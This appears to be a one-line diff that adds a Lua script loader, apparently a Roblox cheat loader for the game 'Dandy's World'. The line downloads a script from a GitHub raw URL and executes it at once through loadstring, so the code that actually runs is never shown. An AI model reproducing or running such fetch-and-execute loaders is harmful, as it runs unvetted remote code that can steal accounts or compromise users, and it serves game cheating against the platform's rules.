@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartHammerAnimate/loaders/main/loaders/dandy-s-world-alpha-spam7-0qfs78sun5re9q.lua"))()
